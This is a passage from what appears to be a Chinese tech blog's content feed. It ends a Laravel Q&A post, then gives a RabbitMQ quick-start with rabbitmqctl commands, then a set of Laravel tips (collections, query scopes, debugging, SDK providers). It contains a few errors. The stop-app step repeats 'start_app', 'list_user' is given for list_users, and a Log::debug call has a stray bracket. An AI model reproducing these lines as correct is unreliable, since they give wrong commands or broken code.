集。</p><p>通常有两种方式解决以上需求：</p><ol><li>冗余字段</li><li>使用 join</li></ol><p>这里顺带介绍一个 Builder marco，也可以解决以上问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于关联关系排序实现</span></span><br><span class="line">Builder::macro(<span class="string">'orderByWith'</span>, </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($relation, $column, $direction = <span class="string">'asc'</span>)</span>: <span class="title">Builder</span></span>&#123;</span><br><span class="line">            <span class="comment">/** <span class="doctag">@var</span> Builder $this */</span></span><br><span class="line">            <span class="keyword">if</span> (is_string($relation)) &#123;</span><br><span class="line">                $relation = <span class="keyword">$this</span>-&gt;getRelationWithoutConstraints($relation);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderBy(</span><br><span class="line">                $relation-&gt;getRelationExistenceQuery(</span><br><span class="line">                    $relation-&gt;getRelated()-&gt;newQueryWithoutRelationships(),</span><br><span class="line">                    <span class="keyword">$this</span>,</span><br><span class="line">                    $column</span><br><span class="line">                ),</span><br><span class="line">                $direction</span><br><span class="line">            );</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>调用方式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于当前分类关联</span></span><br><span class="line">$products = Product::has(<span class="string">'cates'</span>)</span><br><span class="line">    <span class="comment">// 根据分类关联中的sort字段进行排序</span></span><br><span class="line">    -&gt;orderByWith(<span class="string">'cates'</span>, <span class="string">'sort'</span>, <span class="string">'desc'</span>)</span><br><span class="line">    -&gt;paginate($limit);</span><br></pre></td></tr></table></figure><h2 id="问题九"><a href="#问题九" class="headerlink" title="问题九"></a>问题九</h2><p>Observer 还是 Listener？</p><p>Observer 可以监听 Eloquent 模型的 <code>creating</code>、<code>created</code>、<code>saving</code>、<code>saved</code> 等事件，而这些Listener 其实也可以做到，那么对于两者该如何选择呢？</p><p>其实通过观察Observer的逻辑就会发现，它只是在帮助你添加了 listen 的逻辑，帮助你简化了事件 Listener 的注册。</p><p>所以我通常是这么选择的：如果对应场景是 Eloquent 模型的相关事件，则会直接选择 Observer; 如果对应场景是业务事件触发，则会选择Listener。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/sgm4231/p/10194746.html" target="_blank" rel="noopener">Laravel attribute casting 导致的 Indirect modification of overloaded property</a></li><li><a href="https://learnku.com/laravel/t/9290/how-can-laravel-be-sorted-by-associated-fields" target="_blank" rel="noopener">Laravel 怎么通过关联字段排序？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ 快速上手</title>
      <link href="/rabbitmq-quick-start/"/>
      <url>/rabbitmq-quick-start/</url>
      
        <content type="html"><![CDATA[<p>RabbitMQ 学习笔记整理。</p><a id="more"></a><h2 id="Rabbit-是什么？"><a href="#Rabbit-是什么？" class="headerlink" title="Rabbit 是什么？"></a>Rabbit 是什么？</h2><p>它是一个开源的<strong>消息代理和队列服务器</strong>，用来通过普通协议在完全不同的应用中共享数据，Rabbit 是使用Erlang 语言编写的，而RabbitMQ 是基于 AMQP 协议的。</p><blockquote><p>如果你还不知道消息队列是什么，可以查阅我的这篇笔记——<a href="https://www.0x2beace.com/quick-start-message-queue/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9F">快速上手消息队列</a></p></blockquote><h3 id="成熟的消息队列那么多，为什么要选择RabbitMQ？"><a href="#成熟的消息队列那么多，为什么要选择RabbitMQ？" class="headerlink" title="成熟的消息队列那么多，为什么要选择RabbitMQ？"></a>成熟的消息队列那么多，为什么要选择RabbitMQ？</h3><p>工具的选择往往并不直接取决于该工具本身多么优秀，而是该工具能提供的功能，刚才符合我们的需求。</p><p>RabbitMQ 也是，在众多成熟的消息队列中，它的特点如下：</p><ol><li>开源、性能优秀</li><li>提供可靠性消息投递模式、返回模式</li><li>集群模式丰富，支持表达式配置，HA 模式，支持镜像队列模型</li><li>保证数据不丢失的前提下做到高可靠性、可用性</li></ol><h3 id="什么是AMQP-高级协议？"><a href="#什么是AMQP-高级协议？" class="headerlink" title="什么是AMQP 高级协议？"></a>什么是AMQP 高级协议？</h3><p>AMQP 全称（Advanced Message Queuing Protocol）高级消息队列协议。</p><p>它是一个具有现代特征的二进制协议，是一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向信息的中间件设计。</p><p>这个解释太官方了，说了跟没说似的。</p><p>其实呢，通俗一点讲，它就是一个规范，约定了一个<strong>核心概念</strong>，开发时需要遵守该规范。</p><h3 id="AMQP-核心概念"><a href="#AMQP-核心概念" class="headerlink" title="AMQP 核心概念"></a>AMQP 核心概念</h3><p>AMQP 核心概念由以下部分组成：</p><ul><li><code>Server</code>：又称 Broker，接受客户端连接，实现AMQP 实体服务</li><li><code>Connection</code>：连接，应用程序与Broker 的网络连接</li><li><code>Channel</code>：网络信道，几乎所有的操作都在Channel 中进行，Channel 是进行消息读写的通道，客户端可建立多个Channel，每个Channel 代表一个会话任务。</li><li><code>Message</code>：消息，服务器与应用程序之间传送的消息，由Properties 和Body 组成，Properties 可以对消息进行修饰，比如消息的优先级、延迟等高级特性;  Body 就是消息体内容。</li><li><code>Virtual host</code>：虚拟主机，用于进行逻辑隔离，最上层的消息路由，一个Virtual host 里面可以有若干个 Exchange 和Queue，同一个Virtual host 里面不能有相同名称的Exchange 和 Queue 。</li><li><code>Exchange</code>：交换机，接收消息，根据路由键转发消息到绑定的队列</li><li><code>Binding</code>：Exchange 和Queue 之间的虚拟连接，binding 中可以包含 routing key</li><li><code>Routing key</code>：一个路由规则，虚拟机可以用他来确定如何路由一个特定消息</li><li><code>Queue</code>：也称为Message Queue，消息队列，保存消息并将它们转发给消费者</li></ul><h2 id="RabbitMQ-整体架构"><a href="#RabbitMQ-整体架构" class="headerlink" title="RabbitMQ 整体架构"></a>RabbitMQ 整体架构</h2><p>RabbitMQ 整体架构，可以抽象看成三部分组成：</p><ol><li>Produce：消息生产者</li><li>Service：AMQP 服务</li><li>Consume：消息消费者</li></ol><p>一个简单的RabbitMQ 架构图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210627160843.png" alt=""></p><p>在上图中，生产者首先把消息投递到Server 的Exchange 中，然后Exchange 将消息流转到某个Queue 中，生产者监听指定队列从中获取消息。</p><p>在该流程中，生产者不需要关心，将消息投递到哪个队列，只需要关心，将消息投递到哪个Exchange。<br>消费者也不需要关心，消息是从哪个Exchange 中获取的，只需要关心，监听哪个队列。</p><blockquote><p>那么Exchange 与Queue 之间又是如何进行消息流转的呢？</p></blockquote><p>虽然一个Exchange 可以绑定多个Queue，但是路由策略（Routing Key）决定了，最终将消息投递到哪个具体Queue上。</p><h2 id="RabbitMQ-快速上手"><a href="#RabbitMQ-快速上手" class="headerlink" title="RabbitMQ 快速上手"></a>RabbitMQ 快速上手</h2><p>和其他消息队列一样，想要使用，需要先安装队列服务器并启用。</p><p>具体安装过程就不过多介绍，可以前往<a href="https://www.rabbitmq.com/download.html" target="_blank" rel="noopener">官网</a>查看对应操作系统的安装流程。</p><p>安装完成之后，通过<code>rabbitmq-server start_app</code> 命令，启动RabbitMQ 服务。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210627163241.png" alt=""></p><p>如果能看到以上输出，则表示服务已正常启动。</p><h3 id="常见概念"><a href="#常见概念" class="headerlink" title="常见概念"></a>常见概念</h3><ul><li>5672：通信端口号</li><li>15672：管控台端口号</li><li>25672：集群端口号</li><li>rabbitmqctl：基础服务管理</li><li>rabbitmq-plugins：插件管理</li><li>rabbitmq-server</li></ul><p>访问 <code>127.0.0.1:15672</code> 即可看到RabbitMQ 的控制台，默认的账号密码分别为：<code>guest</code>、<code>guest</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210627163710.png" alt=""></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="服务器管理"><a href="#服务器管理" class="headerlink" title="服务器管理"></a>服务器管理</h4><p>启动应用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl start_app</span><br></pre></td></tr></table></figure><p>关闭应用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl start_app</span><br></pre></td></tr></table></figure><p>节点状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl status</span><br></pre></td></tr></table></figure><h4 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h4><p>添加用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl add_user username password</span><br></pre></td></tr></table></figure><p>列出用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl list_user</span><br></pre></td></tr></table></figure><p>删除用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl delete_user username</span><br></pre></td></tr></table></figure><p>清除用户权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl clear_permissions -p vhostpath username</span><br></pre></td></tr></table></figure><p>列出用户权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl list_user_permissions username</span><br></pre></td></tr></table></figure><p>修改密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl change_password username newpassword</span><br></pre></td></tr></table></figure><p>设置用户权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl set_permissions -p vhostpath username</span><br></pre></td></tr></table></figure><h4 id="虚拟主机管理"><a href="#虚拟主机管理" class="headerlink" title="虚拟主机管理"></a>虚拟主机管理</h4><p>创建虚拟主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl add_vhost vhostpath</span><br></pre></td></tr></table></figure><p>列出虚拟主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl list_vhosts</span><br></pre></td></tr></table></figure><p>列出虚拟主机的所有权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl list_permissions -p vhostpath</span><br></pre></td></tr></table></figure><p>删除虚拟主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl delete_vhost vhostpath</span><br></pre></td></tr></table></figure><h4 id="队列管理"><a href="#队列管理" class="headerlink" title="队列管理"></a>队列管理</h4><p>查看所有队列信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl list_queues</span><br></pre></td></tr></table></figure><p>清除队列里的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl -p vhostpath purge_queue blue</span><br></pre></td></tr></table></figure><p>移除所有数据，要在rabbitmqctl stop_app 之后使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl reset</span><br></pre></td></tr></table></figure><h4 id="节点管理"><a href="#节点管理" class="headerlink" title="节点管理"></a>节点管理</h4><p>修改集群节点的存储形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl change_cluster_node_type disc|ram</span><br></pre></td></tr></table></figure><p>忘记节点（摘除节点）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl forget_cluster_node [--offline]</span><br></pre></td></tr></table></figure><p>修改节点名称：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl rename_cluster_node oldnode1 newnode1</span><br></pre></td></tr></table></figure><h4 id="插件管理"><a href="#插件管理" class="headerlink" title="插件管理"></a>插件管理</h4><p>查看插件列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq-plugins list</span><br></pre></td></tr></table></figure><p>启用某个插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq-plugins <span class="built_in">enable</span> &lt;plugin-name&gt;</span><br></pre></td></tr></table></figure><p>禁用某个插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq-plugins <span class="built_in">disable</span> &lt;plugin-name&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MQ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MQ </tag>
            
            <tag> RabbitMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tips of Laravel</title>
      <link href="/tips-of-laravel/"/>
      <url>/tips-of-laravel/</url>
      
        <content type="html"><![CDATA[<p>Awesome tips for Laravel.</p><a id="more"></a><h2 id="善用集合"><a href="#善用集合" class="headerlink" title="善用集合"></a>善用集合</h2><p>Collections 是 Laravel 提供的一个巨大特性，它允许我们轻松地操作数组，可以为我们节省大量时间。</p><p>比如想要对下面这组数据进行求和：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$orders = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">1000</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">80</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">1001</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">120</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">1002</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>使用传统的 <code>foreach</code> 方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$total_price = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($orders <span class="keyword">as</span> $order) &#123;</span><br><span class="line">    $total_price += $order[<span class="string">"price"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试试使用集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total_price = collect($orders)-&gt;pluck(<span class="string">"price"</span>)-&gt;sum();</span><br></pre></td></tr></table></figure><p>虽然两种方式都可以实现，但显然使用集合更容易一些，更多集合的最佳实践可以查看我的另一篇笔记——<a href="https://www.0x2beace.com/the-actual-use-of-collection-in-laravel">Laravel Collection 实际使用</a>。</p><p>善用集合，可以帮我们减少很多重复的代码。</p><h2 id="查询作用域"><a href="#查询作用域" class="headerlink" title="查询作用域"></a>查询作用域</h2><p>通常，在Laravel Eloquent ORM 查询时，需要匹配某些条件时，一般会这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$admin = Admin::where(<span class="string">"is_enable"</span>, <span class="keyword">true</span>)</span><br><span class="line">    -&gt;where(<span class="string">"is_admin"</span>, <span class="keyword">true</span>)</span><br><span class="line">    -&gt;get();</span><br></pre></td></tr></table></figure><p>这样写并没有什么问题，但为了使我们的代码更具可读性，而不是重复性，可以使用 <code>query scope</code>，在对应模型中创建查询作用域：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scopeEnable</span><span class="params">($query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $query-&gt;where(<span class="string">'is_enable'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scopeAdmin</span><span class="params">($query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $query-&gt;where(<span class="string">'is_admin'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，可以通过如下方式进行查询：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$admin = User::enable()</span><br><span class="line">    -&gt;admin()</span><br><span class="line">    -&gt;get();</span><br></pre></td></tr></table></figure><hr><p>如果某个查询条件频繁使用到了，可以在模型中添加全局查询作用域，这样可以默认加上该查询条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">booted</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>::addGlobalScope(<span class="string">"is_deleted"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;where(<span class="string">"is_deleted"</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取消全局查询作用域？</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定类</span></span><br><span class="line">User::withoutGlobalScope(EmailVerifiedAtScope::class)-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定字段</span></span><br><span class="line">User::withoutGlobalScope(<span class="string">'is_deleted'</span>)-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除所有全局作用域</span></span><br><span class="line">User::withoutGlobalScopes()-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除多个类/匿名函数</span></span><br><span class="line">User::withoutGlobalScopes([FirstScope::class, SecondScope::class])-&gt;get();</span><br></pre></td></tr></table></figure><h2 id="Eloqunt-Query"><a href="#Eloqunt-Query" class="headerlink" title="Eloqunt Query"></a>Eloqunt Query</h2><p>实际开发中，因为需求的复杂性，我们往往需要写出各种各样的SQL 来满足查询。</p><p><code>selectRaw()</code>、<code>whereRaw()</code>、<code>havingRaw()</code> 允许我们在查询构造器中，加入原始SQL 查询，例如，统计分组数量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$count = User::groupBy(<span class="string">"is_enable"</span>)</span><br><span class="line">    -&gt;selectRaw(<span class="string">"count(id) as aggregate"</span>)</span><br><span class="line">    -&gt;get();</span><br></pre></td></tr></table></figure><h2 id="Log-and-Debug"><a href="#Log-and-Debug" class="headerlink" title="Log and Debug"></a>Log and Debug</h2><p>Laravel 为我们提供了便捷的调试代码方式——<code>dd()</code>，但某些场景下并不适合使用 <code>dd()</code>，比如测试回调是否正常。</p><p>这时可以使用 <code>Log</code> 助手函数进行调试，生成的日志在<code>storage/logs</code> 目录下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\Log::debug(<span class="string">'Test Message'</span>, $result]);</span><br></pre></td></tr></table></figure><p><code>dd()</code> 作为现代开发者的调试利器，日常开发基本上离不开它，也许你一直都是这么用的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$users = User::where(<span class="string">'name'</span>, <span class="string">'Taylor'</span>)-&gt;get();</span><br><span class="line">dd($users);</span><br></pre></td></tr></table></figure><p>其实有一种更简单的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$users = User::where(<span class="string">'name'</span>, <span class="string">'Taylor'</span>)-&gt;get()-&gt;dd();</span><br></pre></td></tr></table></figure><p>它可以作为一个链式方法，直接放在 Eloquent Query 或者集合的后面进行调用。</p><h2 id="Tinker"><a href="#Tinker" class="headerlink" title="Tinker"></a>Tinker</h2><p>Laravel 的另一大特性就是提供了交互式的命令行——Tinker，在这里你可以执行各种代码，而无需考虑环境，在某些时候，进行调试时是极为方便的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan tinker</span><br></pre></td></tr></table></figure><p>我通常会使用 <code>Tinker</code> 做以下事情：</p><ul><li>检测某段代码是否符合预期</li><li>Eloquent Query 测试</li><li>SDK 测试</li></ul><h2 id="分页求和"><a href="#分页求和" class="headerlink" title="分页求和"></a>分页求和</h2><p>在有分页的情况下，如何统计某个字段所有记录的总和？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个查询构造器</span></span><br><span class="line">$query = Post::query();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在查询分页之前求和</span></span><br><span class="line">$sum = $query-&gt;sum(<span class="string">'post_views'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询分页</span></span><br><span class="line">$posts = $query-&gt;paginate(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><h2 id="Data-Get-Function"><a href="#Data-Get-Function" class="headerlink" title="Data Get Function"></a>Data Get Function</h2><p>如果有一个复杂的数组对象数据结构，可以使用 <code>data_get</code> 助手函数使用<code>.</code> 表示法和 <code>*</code> 通配符从嵌套数组或对象中检索值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$data = [</span><br><span class="line">    <span class="number">0</span> =&gt; [<span class="string">'user_id'</span> =&gt;<span class="string">'1'</span>,  <span class="string">'post'</span> =&gt; [<span class="string">"id"</span> =&gt; <span class="number">1000</span>],],</span><br><span class="line">    <span class="number">1</span> =&gt; [<span class="string">'user_id'</span> =&gt;<span class="string">'2'</span>,  <span class="string">'post'</span> =&gt; [<span class="string">"id"</span> =&gt; <span class="number">1001</span>], ],</span><br><span class="line">    <span class="number">2</span> =&gt; [<span class="string">'user_id'</span> =&gt;<span class="string">'3'</span>,  <span class="string">'post'</span> =&gt; [<span class="string">"id"</span> =&gt; <span class="number">1002</span>], ],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$ids = data_get($data, <span class="string">"*.post.id"</span>);</span><br><span class="line"><span class="comment">// [1000, 1001, 1002]</span></span><br></pre></td></tr></table></figure><h2 id="optional"><a href="#optional" class="headerlink" title="optional"></a>optional</h2><p><code>optional()</code> 方法允许你获取对象的属性时调用该方法。如果该对象为 null，那么属性或者方法也会返回 null 而不是引起一个错误：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User 2 exists, without account</span></span><br><span class="line">$user2 = User::find(<span class="number">2</span>);</span><br><span class="line">$accountId = $user2-&gt;account-&gt;id; <span class="comment">// PHP Error: Trying to get property of non-object</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Fix without optional()</span></span><br><span class="line">$accountId = $user2-&gt;account ? $user2-&gt;account-&gt;id : <span class="keyword">null</span>; <span class="comment">// null</span></span><br><span class="line">$accountId = $user2-&gt;account-&gt;id ?? <span class="keyword">null</span>; <span class="comment">// null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Fix with optional()</span></span><br><span class="line">$accountId = optional($user2-&gt;account)-&gt;id; <span class="comment">// null</span></span><br></pre></td></tr></table></figure><h2 id="封装SDK"><a href="#封装SDK" class="headerlink" title="封装SDK"></a>封装SDK</h2><p>通常在安装了一个 SDK 之后，我们可以做一些简单的封装，这样使用起来会更方便。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:provider JpushServiceProvider</span><br></pre></td></tr></table></figure><p>这里以极光推送 这个第三方推送服务商为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">JPush</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JpushServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;singleton(Client::class, <span class="function"><span class="keyword">function</span> <span class="params">($app)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Client(config(<span class="string">'jpush.key'</span>), config(<span class="string">'jpush.secret'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;alias(Client::class, <span class="string">'jpush'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加入到 <code>config/app.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 